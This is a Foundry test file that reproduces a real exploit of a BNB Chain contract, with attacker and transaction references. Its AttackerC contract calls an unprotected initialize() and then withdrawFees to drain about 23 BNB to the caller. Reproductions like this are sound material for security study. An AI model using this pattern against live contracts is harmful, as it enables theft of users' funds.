pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 15.2k USD
// Attacker : 0x8149f77504007450711023cf0ec11bdd6348401f
// Attack Contract : https://bscscan.com/address/0x009e64c02848dc51aa3f46775c2cfbf1190c2841
// Vulnerable Contract : https://bscscan.com/address/0xd4f1afd0331255e848c119ca39143d41144f7cb3
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0xc7fc7e066ec2d4ea659061b75308c9016c0efab329d1055c2a8d91cc11dc3868

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xd4f1afd0331255e848c119ca39143d41144f7cb3

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1890776122918309932
// Twitter Guy : https://x.com/TenArmorAlert/status/1890776122918309932
// Hacking God : N/A

address constant addr = 0xD4F1AFD0331255e848c119CA39143D41144f7Cb3;
address constant zero = 0x0000000000000000000000000000000000000000;
address constant attacker = 0xF30Be320c55038d7F784c561E56340439Dd1a283;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 46681362);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(address(attC), 23.007026290916617 ether);
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x009E64c02848dc51aA3f46775c2cfBf1190C2841
contract AttackerC {
    constructor() {
        // call_1: addr.initialize()
        (bool s1, ) = addr.call(abi.encodeWithSelector(bytes4(keccak256("initialize()"))));
        require(s1, "init failed");
        // call_2: addr.withdrawFees(address _to, uint256 _amount)
        (bool s2, ) = addr.call(
            abi.encodeWithSelector(
                bytes4(keccak256("withdrawFees(address,uint256)")),
                zero,
                uint256(23007026290916620075)
            )
        );
        require(s2, "withdrawFees failed");
        // call_3: send value to tx.origin
        payable(tx.origin).transfer(23007026290916620075);
    } 
}